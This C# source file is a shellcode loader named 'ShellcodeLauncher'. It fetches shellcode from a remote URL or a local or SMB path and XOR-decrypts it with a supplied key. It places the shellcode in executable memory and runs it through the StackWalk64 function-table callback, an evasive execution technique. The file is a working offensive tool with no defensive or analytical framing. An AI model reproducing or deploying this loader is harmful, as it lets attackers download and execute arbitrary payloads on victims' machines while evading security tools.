using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.Http;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("Dbghelp.dll")]
    public static extern bool StackWalk64(
        uint MachineType,
        IntPtr hProcess,
        IntPtr hThread,
        ref STACKFRAME64 StackFrame,
        ref CONTEXT ContextRecord,
        IntPtr ReadMemoryRoutine,
        FUNCTION_TABLE_ACCESS_ROUTINE FunctionTableAccessRoutine,
        IntPtr GetModuleBaseRoutine,
        IntPtr TranslateAddress
    );

    [StructLayout(LayoutKind.Sequential)]
    public struct STACKFRAME64
    {
        public ADDRESS64 AddrPC;           // program counter
        public ADDRESS64 AddrReturn;       // return address
        public ADDRESS64 AddrFrame;        // frame pointer
        public ADDRESS64 AddrStack;        // stack pointer
        public ADDRESS64 AddrBStore;       // backing store pointer
        public ADDRESS64 AddrInstr;        // instruction pointer
        public byte[] Params;              // possible arguments to the function
        public bool Far;                   // TRUE if this is a WOW far call
        public bool Virtual;               // TRUE if this is a virtual frame
        public byte[] Reserved;            // for future use
        public KDHELP64 KdHelp;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ADDRESS64
    {
        public ulong Offset;
        public ushort Segment;
        public AddressMode Mode;
    }

    public enum AddressMode : ushort
    {
        AddrMode1616,
        AddrMode1632,
        AddrModeReal,
        AddrModeFlat
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct KDHELP64
    {
        public ulong Thread;
        public uint ThCallbackStack;
        public uint ThCallbackBStore;
        public uint NextCallback;
        public uint FramePointer;
        public uint KiCallUserMode;
        public uint KeUserCallbackDispatcher;
        public uint SystemRangeStart;
        public uint KiUserExceptionDispatcher;
        public uint KiUserApcDispatcher;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT
    {
        public ulong P1Home;
        public ulong P2Home;
        public ulong P3Home;
        public ulong P4Home;
        public ulong P5Home;
        public ulong P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs;
        public ushort SegDs;
        public ushort SegEs;
        public ushort SegFs;
        public ushort SegGs;
        public ushort SegSs;
        public uint EFlags;
        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;
        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip;
        public byte[] FloatingRegisterSaveArea;
        public ulong VectorRegisterSaveArea;
        public ulong VectorControl;
        public ulong DebugControl;
        public ulong LastBranchToRip;
        public ulong LastBranchFromRip;
        public ulong LastExceptionToRip;
        public ulong LastExceptionFromRip;
    }


    public delegate IntPtr FUNCTION_TABLE_ACCESS_ROUTINE(IntPtr hProcess, IntPtr AddrBase);

    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint IMAGE_FILE_MACHINE_AMD64 = 0x8664;

    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: ShellcodeLauncher.exe [-r remote_url | local_path_or_SMB_path] [-k xor_key]");
            return;
        }

        string sourcePath = args[1];
        string xorKey = null;

        if (args.Length == 4 && args[2] == "-k")
        {
            xorKey = args[3];
        }

        byte[] shellcode;

        if (args[0] == "-r")
        {
            Console.WriteLine("[Info] Attempting to download shellcode from the provided URL.");
            shellcode = DownloadShellcodeFromUrl(sourcePath);
        }
        else
        {
            Console.WriteLine("[Info] Attempting to read shellcode from the provided file path.");
            shellcode = File.ReadAllBytes(sourcePath);
        }

        if (!string.IsNullOrEmpty(xorKey))
        {
            Console.WriteLine("[Info] Decrypting shellcode using the provided XOR key.");
            shellcode = DecryptShellcode(shellcode, xorKey);
        }

        if (shellcode == null || shellcode.Length == 0)
        {
            Console.WriteLine("[Failed] Failed to load or decrypt shellcode.");
            return;
        }
        else
        {
            Console.WriteLine("[Success] Shellcode loaded/decrypted successfully.");
        }

        Console.WriteLine("[Info] Allocating memory for shellcode.");
        IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (hAlloc == IntPtr.Zero)
        {
            Console.WriteLine($"[Failed] Memory allocation for shellcode failed. Error Code: {Marshal.GetLastWin32Error()}");
            return;
        }
        else
        {
            Console.WriteLine("[Success] Memory allocated for shellcode.");
        }

        Console.WriteLine("[Info] Copying shellcode to allocated memory.");
        Marshal.Copy(shellcode, 0, hAlloc, shellcode.Length);

        STACKFRAME64 sStackFrame = new STACKFRAME64();
        CONTEXT sContext = new CONTEXT();

        Console.WriteLine("[Info] Invoking StackWalk64 function.");
        bool result = StackWalk64(
            IMAGE_FILE_MACHINE_AMD64,
            IntPtr.Zero,
            IntPtr.Zero,
            ref sStackFrame,
            ref sContext,
            IntPtr.Zero,
            (FUNCTION_TABLE_ACCESS_ROUTINE)Marshal.GetDelegateForFunctionPointer(hAlloc, typeof(FUNCTION_TABLE_ACCESS_ROUTINE)),
            IntPtr.Zero,
            IntPtr.Zero
        );

        if (result)
        {
            Console.WriteLine("[Success] StackWalk64 function invoked successfully.");
        }
        else
        {
            Console.WriteLine($"[Failed] StackWalk64 function failed with error code: {Marshal.GetLastWin32Error()}");
        }

        Console.WriteLine("[Info] Freeing allocated memory.");
        VirtualFree(hAlloc, 0, 0x8000);
    }



    static byte[] DownloadShellcodeFromUrl(string url)
    {
        using (var httpClient = new HttpClient())
        {
            try
            {
                var byteArray = httpClient.GetByteArrayAsync(url).Result;
                if (byteArray != null && byteArray.Length > 0)
                {
                    Console.WriteLine("[Success] Shellcode downloaded successfully.");
                    return byteArray;
                }
                else
                {
                    Console.WriteLine("[Failed] Shellcode downloaded but the content is empty or null.");
                    return null;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Failed] Downloading shellcode: {ex.Message}");
                return null;
            }
        }
    }

    static byte[] DecryptShellcode(byte[] encryptedShellcode, string xorKey)
    {
        byte[] decryptedShellcode = new byte[encryptedShellcode.Length];
        for (int i = 0; i < encryptedShellcode.Length; i++)
        {
            decryptedShellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]);
        }
        return decryptedShellcode;
    }
}

